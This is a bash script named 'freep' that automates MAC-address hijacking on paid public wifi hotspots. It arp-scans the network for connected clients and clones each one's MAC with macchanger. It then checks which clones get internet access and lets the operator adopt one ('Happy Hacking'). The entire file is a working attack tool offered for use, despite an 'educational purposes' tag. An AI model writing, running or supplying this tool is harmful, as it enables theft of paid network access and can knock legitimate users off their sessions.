#! /usr/bin/bash
# Just a mac intended for public paid wifi internet hotspots
# get user with internet / switch between users who had internet

#Declaring variables
red='\033[1;31m'
Yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
#Dancing panda Variables
purple_panda='\033[6;35m'

    #configuration files & data files
online="online_users.txt"
total_users="allusers.txt"
complete_users="users.txt"
    #file paths shortened for no reason
config_path="/tmp/freep"
previous_config_path="/tmp/freep/freepcollections"
#freepwaifu new logo
banner(){
echo -e ${purple_panda}"
                    |───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───|
█▀▀ █▀█ █▀▀ █▀▀ █▀█ |───█▒▒░░░░░░░░░▒▒█───|
█▀░ █▀▄ ██▄ ██▄ █▀▀ |────█░░█░░░░░█░░█────|
                    |─▄▄──█░░░▀█▀░░░█──▄▄─|  █░█░█ ▄▀█ █ █▀▀ █░█
                    |█░░█─▀▄░░░░░░░▄▀─█░░█|  ▀▄▀▄▀ █▀█ █ █▀░ █▄█

                loading program..................................
                    
"${reset}                   
}
#length time functions
drowsy_1(){
    sleep 1
}
drowsy_2(){
    sleep 5
}
drowsy_3(){
    sleep 3
}
banner
#Temporary file management written poorly but exists for some reason
if [[ -d $config_path ]]; then
    echo -e "[✔] ${Yellow} located alien spacecship....${reset}"
    drowsy_1
    if [[ -f $config_path/$total_users ]]; then
        echo -e "[✔] ${Yellow} Found and killed alien life.. ${reset}"
        rm -rf $config_path/$total_users
        drowsy_1
    else
        echo -e "[◉]${Yellow} Alien life not found ${reset}"
    fi
     if [[ -f $config_path/$complete_users ]]; then
        echo -e "[✔] ${Yellow} Found and killed alien life.. ${reset}"
        rm -rf $config_path/$complete_users
        drowsy_1
    else
        echo -e "[◉]${Yellow} Alien life not found ${reset}"
    fi
     if [[ -f $config_path/$online ]]; then
        echo -e "[✔] ${Yellow} Found cute alien , storing her... ${reset}"
        cat "$config_path/$online" >> $previous_config_path/$online
        rm -rf $config_path/$online
        drowsy_1
    else
        echo -e "[◉]${Yellow} Alien life not found ${reset}"
        drowsy_1
    fi
else
    mkdir {"$config_path/","$previous_config_path/"}
    echo -e "${Yellow} ..Initialised configuration files ${reset}"
    drowsy_1
    clear
fi   
#Userfull functions
get_interface(){
   interface=$(iw dev | awk '$1=="Interface"{print $2}') 
}
disable_wifi_iface(){
    sudo ifconfig $interface down
}
enable_wifi_iface(){
    sudo ifconfig $interface up
}
select_point(){
    if [[ -f $previous_config_path/$online ]]; then
        output=$(cat $previous_config_path/$online | fzf)
        get_interface
        disable_wifi_iface
        ifconfig $interface hw ether $output
        enable_wifi_iface
        echo -e "[✔] ${Yellow} Happy Hacking ${reset}"
    else
        echo -e "[◉] ${Yellow} Alien life was not found, Run live scan ${reset}"
    fi

}

wifi_spoof_tool(){
    echo -e "${Yellow} Enter the public paid wifi name....${reset}"
    read wifiname_1
    nmcli d wifi connect "${wifiname_1}" &> /dev/null
    drowsy_2
    sudo arp-scan -l | awk '/.*:.*:.*:.*:.*:.*/{print $2}' >> $config_path/$total_users
    tail -n +4 $config_path/$total_users >> $config_path/$complete_users
    tots=$(wc -l $config_path/$complete_users | awk '{print $1}')
    echo -e "${Yellow} $tots users connected to network ${reset}"
    input="$config_path/$complete_users"
    while IFS= read -r user
    do
        get_interface
        disable_wifi_iface
        drowsy_1
        sudo macchanger --mac=${user} $interface &>/dev/null
        drowsy_1
        enable_wifi_iface
	#sudo macchanger --show $interface
        drowsy_3
        nmcli d wifi connect "${wifiname_1}" &>/dev/null
        drowsy_2
        Routing_to=$(ip route show default | awk '/default/ {print $3}')
        echo -e "${Yellow} [~]${reset} Checking interent connectivity on ${Yellow} $user ${reset} ... Route:_ ${Yellow} $Routing_to ${reset}"
		PING_TARGET="google.com"
        	PING_RESULT=$(ping -c 1 "$PING_TARGET" 2>&1)
        	#wget -q --tries=20 --timeout=10 --spider google.com
		#wget -q --spider google.com
		if [[ $? -eq 0 ]]; then
			echo -e "[✔] ${Yellow} Internet available ${reset}"
			echo "$user" >> $config_path/$online
		else
			echo -e "[◉] ${red} No internet conections ${reset}"
		fi
    done < "$input"
	echo -e "${Yellow} Would you like 2 set a live user from scanned [y/n] ${reset}"
	read part2
	if [[ "$part2" == "y" || "yes" || "Y" || "Yes" || "YES" ]]; then
		if [[ -f $config_path/$online ]]; then
			output=$(cat $config_path/$online | fzf)
			get_interface
			kill_wifi
			sudo macchanger --mac=${output} $interface $>/dev/null
			wake_wifi
			echo -e "[✔] ${Yellow} Happy hacking if successfull ${reset}"
		else
			echo -e "[◉] ${Yellow} You lets check storage"
			sleep 2
			select_point

		fi
    fi
}
banner_screen(){
echo -e ${purple}"
                    |───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───|
█▀▀ █▀█ █▀▀ █▀▀ █▀█ |───█▒▒░░░░░░░░░▒▒█───|
█▀░ █▀▄ ██▄ ██▄ █▀▀ |────█░░█░░░░░█░░█────|
                    |─▄▄──█░░░▀█▀░░░█──▄▄─|  █░█░█ ▄▀█ █ █▀▀ █░█
                    |█░░█─▀▄░░░░░░░▄▀─█░░█|  ▀▄▀▄▀ █▀█ █ █▀░ █▄█
                    
"${reset}
echo -e ${Yellow} "  │   ©Yada 2022 --Made with Love For Educational Purposes        "${reset}                   
}
clear
banner_screen
cat << EOF
Choose your Poison:
    1. Scan for live internet user
    2. Select live user from file
    3. Remove all alien life
    0. Quit
EOF
echo -n 'Enter selection [0-quit]: '
read -r poison

case $poison in
	0) echo "Program terminated.";;
	1) wifi_spoof_tool ;;
	2) select_point ;;
	3)
		rm -rf /tmp/freep
	;;
	*)
		echo "Invalid entry." >&2
		exit 1
esac
